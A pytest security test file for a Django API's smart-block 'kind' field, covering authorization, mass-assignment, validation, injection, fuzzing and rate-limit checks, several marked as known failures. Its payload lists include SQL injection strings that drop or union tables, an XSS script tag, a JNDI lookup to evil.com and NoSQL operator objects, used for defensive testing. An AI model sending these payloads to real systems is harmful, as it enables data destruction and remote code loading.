"""T288: Smart block kind field redteam security tests.

Tests for BOLA, BOPLA, type confusion, injection in SmartBlock kind field.
"""

import json

import pytest

from model_bakery import baker
from rest_framework.test import APIClient

from api.core.models import User
from api.schedule.models import SmartBlock, SmartBlockCriteria

# Payloads for fuzzing
INVALID_KIND_VALUES = [
    "",
    "null",
    "undefined",
    "true",
    "false",
    "0",
    "1",
    "STATIC",
    "DYNAMIC",
    "Static",
    "Dynamic",
    "static\x00",
    "dynamic\x00",
    "static\n",
    " dynamic ",
    "\tstatic\t",
    "s t a t i c",
    "<script>alert(1)</script>",
    "'; DROP TABLE cc_block; --",
    "' OR '1'='1",
    "${jndi:ldap://evil.com}",
    "__proto__",
    "constructor",
    "prototype",
    "admin",
    "superuser",
    "system",
    "internal",
    "private",
    "public",
    "draft",
    "published",
    "archived",
    "deleted",
    "🎵🎶",
    "日本語",
    "العربية",
    "🔥💀",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT * FROM cc_block--",
    "1; DROP TABLE cc_block--",
    "static' AND 1=1--",
    "dynamic' AND 1=2--",
    "%' OR '0'='0",
    "'/**/OR/**/'1'='1",
]

NOSQL_PAYLOADS = [
    {"$ne": None},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$in": ["static", "dynamic"]},
]


class TestSmartBlockKindBOLA:
    """BOLA: Broken Object Level Authorization tests."""

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T829: BOLA - no ownership check in SmartBlockViewSet",
    )
    def test_bola_retrieve_other_users_smartblock(self, api_client, faker):
        """Attacker can retrieve victim's smart block including kind field."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        victim_block = baker.make(
            SmartBlock,
            name="Victim Private SmartBlock",
            owner=victim,
            kind=SmartBlock.Kind.DYNAMIC,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.get(f"/api/v2/smart-blocks/{victim_block.id}")

        assert (
            response.status_code == 403
        ), f"T829: BOLA - attacker accessed victim smart block (got {response.status_code})"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T830: BOLA - LIST shows all smart blocks")
    def test_bola_list_shows_all_smartblocks(self, api_client, faker):
        """LIST returns all smart blocks regardless of owner."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        victim_block = baker.make(
            SmartBlock,
            name="Victim Secret SmartBlock",
            owner=victim,
            kind=SmartBlock.Kind.STATIC,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.get("/api/v2/smart-blocks")

        assert response.status_code == 200
        data = response.json()
        block_names = [b.get("name") for b in data]
        assert (
            "Victim Secret SmartBlock" not in block_names
        ), "T830: BOLA - LIST shows victim's private smart blocks"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T831: BOLA - attacker can update victim's smart block kind",
    )
    def test_bola_update_other_users_smartblock_kind(self, api_client, faker):
        """Attacker can change victim's smart block kind."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        victim_block = baker.make(
            SmartBlock,
            name="Victim SmartBlock",
            owner=victim,
            kind=SmartBlock.Kind.STATIC,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.patch(
            f"/api/v2/smart-blocks/{victim_block.id}",
            json.dumps({"kind": "dynamic"}),
            content_type="application/json",
        )

        assert response.status_code in [
            403,
            404,
        ], f"T831: BOLA - attacker updated victim's smart block (got {response.status_code})"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T832: BOLA - attacker can delete victim's smart block",
    )
    def test_bola_delete_other_users_smartblock(self, api_client, faker):
        """Attacker can delete victim's smart block."""
        victim = baker.make(User, username=f"victim_{faker.user_name()}")
        attacker = baker.make(User, username=f"attacker_{faker.user_name()}")

        victim_block = baker.make(
            SmartBlock,
            name="Victim SmartBlock to Delete",
            owner=victim,
            kind=SmartBlock.Kind.DYNAMIC,
        )

        client = APIClient()
        client.force_authenticate(user=attacker)

        response = client.delete(f"/api/v2/smart-blocks/{victim_block.id}")

        assert response.status_code in [
            403,
            404,
        ], f"T832: BOLA - attacker deleted victim's smart block (got {response.status_code})"


class TestSmartBlockKindBOPLA:
    """BOPLA: Broken Object Property Level Authorization tests."""

    @pytest.mark.django_db
    def test_bopla_mass_assignment_id_field(
        self,
        api_client,
        admin_user,
        faker,
    ):
        """Try to set id field during CREATE."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "id": 999999,
                    "name": "SmartBlock with custom ID",
                    
                    "kind": "dynamic",
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert (
                data.get("id") != 999999
            ), "T833: BOPLA - mass assignment of id field allowed"

    @pytest.mark.django_db
    @pytest.mark.xfail(
        reason="T834: BOPLA - mass assignment of created_at allowed",
    )
    def test_bopla_mass_assignment_created_at(
        self,
        api_client,
        admin_user,
        faker,
    ):
        """Try to set created_at during CREATE."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "SmartBlock with custom timestamp",
                    
                    "kind": "static",
                    "created_at": "2020-01-01T00:00:00Z",
                },
            ),
            content_type="application/json",
        )

        assert response.status_code == 201
        data = response.json()
        assert "2020" not in str(
            data.get("created_at", ""),
        ), "T834: BOPLA - mass assignment of created_at allowed"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T835: BOPLA - owner change via PATCH allowed")
    def test_bopla_change_owner_via_update(
        self,
        api_client,
        admin_user,
        regular_user,
        faker,
    ):
        """Try to change smart block owner via PATCH."""
        block = baker.make(
            SmartBlock,
            name="Test SmartBlock",
            owner=admin_user,
            kind=SmartBlock.Kind.DYNAMIC,
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"owner": regular_user.id}),
            content_type="application/json",
        )

        assert response.status_code == 200
        data = response.json()
        assert (
            data.get("owner") != regular_user.id
        ), "T835: BOPLA - owner change via PATCH allowed"

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T836: BOPLA - extra fields silently accepted")
    def test_bopla_extra_fields_not_rejected(
        self,
        api_client,
        admin_user,
        faker,
    ):
        """Extra fields should be rejected, not silently ignored."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "SmartBlock with extra fields",
                    
                    "kind": "static",
                    "is_admin": True,
                    "role": "superuser",
                    "password": "hacked",
                },
            ),
            content_type="application/json",
        )

        assert (
            response.status_code == 400
        ), f"T836: BOPLA - extra fields silently accepted (got {response.status_code})"


class TestSmartBlockKindValidation:
    """Kind field validation bypass tests."""

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T837: Invalid kind values accepted")
    def test_invalid_kind_values_rejected(self, api_client, admin_user, faker):
        """Invalid kind values should be rejected."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        invalid_kinds = [
            "invalid",
            "admin",
            "superuser",
            "",
            "null",
            "undefined",
        ]

        for kind in invalid_kinds:
            response = client.post(
                "/api/v2/smart-blocks",
                json.dumps(
                    {
                        "name": f"Invalid Kind Test {kind}",
                        
                        "kind": kind,
                    },
                ),
                content_type="application/json",
            )

            assert (
                response.status_code == 400
            ), f"T837: Invalid kind '{kind}' accepted"

    @pytest.mark.django_db
    def test_kind_case_sensitivity(self, api_client, admin_user, faker):
        """Kind values should be case-sensitive."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Case Sensitivity Test",
                    
                    "kind": "STATIC",  # Uppercase
                },
            ),
            content_type="application/json",
        )

        # Should reject or normalize to lowercase
        if response.status_code == 201:
            data = response.json()
            assert (
                data.get("kind") == "static"
            ), "T838: Uppercase kind not normalized"

    @pytest.mark.django_db
    def test_kind_with_whitespace(self, api_client, admin_user, faker):
        """Kind values with whitespace should be handled."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Whitespace Kind Test",
                    
                    "kind": " static ",  # With spaces
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            data = response.json()
            assert (
                data.get("kind") == "static"
            ), "T839: Whitespace not trimmed from kind"

    @pytest.mark.django_db
    def test_kind_null_bytes(self, api_client, admin_user, faker):
        """Null bytes in kind should be rejected."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Null Byte Kind Test",
                    
                    "kind": "static\x00dynamic",
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            pytest.fail("T840: Null bytes in kind field accepted")


class TestSmartBlockKindInjection:
    """Injection vulnerability tests in kind field."""

    @pytest.mark.django_db
    def test_sqli_in_kind_field_create(self, api_client, admin_user):
        """SQL injection in kind field during CREATE."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in SQLI_PAYLOADS[:5]:
            response = client.post(
                "/api/v2/smart-blocks",
                json.dumps(
                    {
                        "name": "SQLi Test",
                        
                        "kind": payload,
                    },
                ),
                content_type="application/json",
            )

            if response.status_code >= 500:
                pytest.fail(f"T841: SQLi in kind field causes 500: {payload}")

            response_text = response.content.decode().lower()
            sql_errors = [
                "sql",
                "sqlite",
                "mysql",
                "postgresql",
                "syntax error",
            ]
            for err in sql_errors:
                if err in response_text:
                    pytest.fail(f"T841: SQL error disclosed: {err}")

    @pytest.mark.django_db
    def test_sqli_in_kind_filter(self, api_client, admin_user):
        """SQL injection in kind query parameter."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in SQLI_PAYLOADS[:5]:
            response = client.get(f"/api/v2/smart-blocks?kind={payload}")

            if response.status_code >= 500:
                pytest.fail(f"T842: SQLi in kind filter causes 500: {payload}")

    @pytest.mark.django_db
    def test_nosql_injection_kind_field(self, api_client, admin_user):
        """NoSQL injection attempts in kind field."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in NOSQL_PAYLOADS:
            response = client.post(
                "/api/v2/smart-blocks",
                json.dumps(
                    {
                        "name": "NoSQLi Test",
                        
                        "kind": payload,
                    },
                ),
                content_type="application/json",
            )

            if response.status_code == 201:
                pytest.fail(
                    f"T843: NoSQL object accepted in kind field: {payload}",
                )


class TestSmartBlockKindLogic:
    """Business logic flaw tests."""

    @pytest.mark.django_db
    def test_change_kind_with_criteria_static_to_dynamic(
        self,
        api_client,
        admin_user,
        faker,
    ):
        """Changing kind from static to dynamic when criteria exist."""
        block = baker.make(
            SmartBlock,
            name="Static Block With Criteria",
            owner=admin_user,
            kind=SmartBlock.Kind.STATIC,
        )

        # Add criteria (normally only for dynamic)
        criteria = baker.make(
            SmartBlockCriteria,
            block=block,
            criteria="title",
            condition="contains",
            value="test",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Try to change to dynamic (should be OK since criteria exist)
        response = client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"kind": "dynamic"}),
            content_type="application/json",
        )

        assert response.status_code == 200

    @pytest.mark.django_db
    def test_change_kind_dynamic_to_static_with_criteria(
        self,
        api_client,
        admin_user,
        faker,
    ):
        """Changing kind from dynamic to static when criteria exist."""
        block = baker.make(
            SmartBlock,
            name="Dynamic Block With Criteria",
            owner=admin_user,
            kind=SmartBlock.Kind.DYNAMIC,
        )

        # Add criteria
        criteria = baker.make(
            SmartBlockCriteria,
            block=block,
            criteria="title",
            condition="contains",
            value="test",
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        # Try to change to static (may orphan criteria)
        response = client.patch(
            f"/api/v2/smart-blocks/{block.id}",
            json.dumps({"kind": "static"}),
            content_type="application/json",
        )

        # This should either be blocked or cascade delete criteria
        if response.status_code == 200:
            # Check if criteria still exist (potential inconsistency)
            pass  # May be valid behavior

    @pytest.mark.django_db
    def test_create_dynamic_without_criteria(
        self,
        api_client,
        admin_user,
        faker,
    ):
        """Dynamic block without criteria should be handled."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Dynamic Without Criteria",
                    
                    "kind": "dynamic",
                },
            ),
            content_type="application/json",
        )

        # Should be allowed (criteria can be added later)
        assert response.status_code == 201


class TestSmartBlockKindFuzzing:
    """Fuzzing tests for kind field."""

    @pytest.mark.django_db
    def test_fuzzing_kind_field_create(self, api_client, admin_user):
        """Fuzz kind field with various payloads."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in INVALID_KIND_VALUES[:15]:
            response = client.post(
                "/api/v2/smart-blocks",
                json.dumps(
                    {
                        "name": f"Fuzz {str(payload)[:20]}",
                        
                        "kind": payload,
                    },
                ),
                content_type="application/json",
            )

            if response.status_code >= 500:
                pytest.fail(
                    f"T844: Fuzzing payload caused 500: {str(payload)[:50]}",
                )

    @pytest.mark.django_db
    def test_fuzzing_kind_filter(self, api_client, admin_user):
        """Fuzz kind query parameter."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        for payload in INVALID_KIND_VALUES[:10]:
            response = client.get(f"/api/v2/smart-blocks?kind={payload}")

            if response.status_code >= 500:
                pytest.fail(
                    f"T845: Kind filter fuzzing caused 500: {str(payload)[:50]}",
                )


class TestSmartBlockKindDoS:
    """Denial of Service tests."""

    @pytest.mark.django_db
    def test_very_long_kind_string(self, api_client, admin_user):
        """Very long kind string should be rejected."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        long_kind = "static" * 1000  # 6000+ chars

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Long Kind Test",
                    
                    "kind": long_kind,
                },
            ),
            content_type="application/json",
        )

        if response.status_code == 201:
            pytest.fail("T846: Very long kind string accepted (DoS risk)")

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T847: No rate limiting on smart-block CREATE")
    def test_rapid_create_requests(self, api_client, admin_user):
        """Rapid CREATE requests should be rate limited."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        responses = []
        for i in range(50):
            response = client.post(
                "/api/v2/smart-blocks",
                json.dumps(
                    {
                        "name": f"Rapid Test {i}",
                        
                        "kind": "static" if i % 2 == 0 else "dynamic",
                    },
                ),
                content_type="application/json",
            )
            responses.append(response.status_code)

            if response.status_code == 429:
                return  # Rate limiting works

        success_count = sum(1 for r in responses if r == 201)
        assert (
            success_count < 50
        ), "T847: No rate limiting on smart-block CREATE"


class TestSmartBlockKindFilter:
    """Kind filter parameter tests."""

    @pytest.mark.django_db
    def test_filter_by_kind_static(self, api_client, admin_user, faker):
        """Filter smart blocks by static kind."""
        baker.make(
            SmartBlock,
            name="Static 1",
            owner=admin_user,
            kind=SmartBlock.Kind.STATIC,
        )
        baker.make(
            SmartBlock,
            name="Dynamic 1",
            owner=admin_user,
            kind=SmartBlock.Kind.DYNAMIC,
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.get("/api/v2/smart-blocks?kind=static")

        assert response.status_code == 200
        data = response.json()
        for block in data:
            assert block["kind"] == "static"

    @pytest.mark.django_db
    def test_filter_by_kind_dynamic(self, api_client, admin_user, faker):
        """Filter smart blocks by dynamic kind."""
        baker.make(
            SmartBlock,
            name="Static 1",
            owner=admin_user,
            kind=SmartBlock.Kind.STATIC,
        )
        baker.make(
            SmartBlock,
            name="Dynamic 1",
            owner=admin_user,
            kind=SmartBlock.Kind.DYNAMIC,
        )

        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.get("/api/v2/smart-blocks?kind=dynamic")

        assert response.status_code == 200
        data = response.json()
        for block in data:
            assert block["kind"] == "dynamic"

    @pytest.mark.django_db
    def test_filter_by_invalid_kind(self, api_client, admin_user, faker):
        """Filter by invalid kind should return empty or error."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.get("/api/v2/smart-blocks?kind=invalid")

        # Should either return empty list or 400 error
        if response.status_code == 200:
            data = response.json()
            assert (
                len(data) == 0
            ), "T848: Invalid kind filter returns non-empty results"

    @pytest.mark.django_db
    def test_filter_by_empty_kind(self, api_client, admin_user, faker):
        """Filter by empty kind parameter."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.get("/api/v2/smart-blocks?kind=")

        # Should ignore empty filter or handle gracefully
        assert response.status_code in [200, 400]


class TestSmartBlockKindInfoDisclosure:
    """Information disclosure tests."""

    @pytest.mark.django_db
    @pytest.mark.xfail(reason="T849: Error message leaks table name cc_block")
    def test_error_message_leaks_structure(self, api_client, admin_user):
        """Error messages should not leak database structure."""
        client = APIClient()
        client.force_authenticate(user=admin_user)

        response = client.post(
            "/api/v2/smart-blocks",
            json.dumps(
                {
                    "name": "Error Test",
                    
                    "kind": "'; DROP TABLE cc_block; --",
                },
            ),
            content_type="application/json",
        )

        if response.status_code >= 400:
            response_text = response.content.decode().lower()
            sensitive_patterns = [
                "cc_block",
            ]
            for pattern in sensitive_patterns:
                assert (
                    pattern not in response_text
                ), f"T849: Error message leaks DB structure: {pattern}"
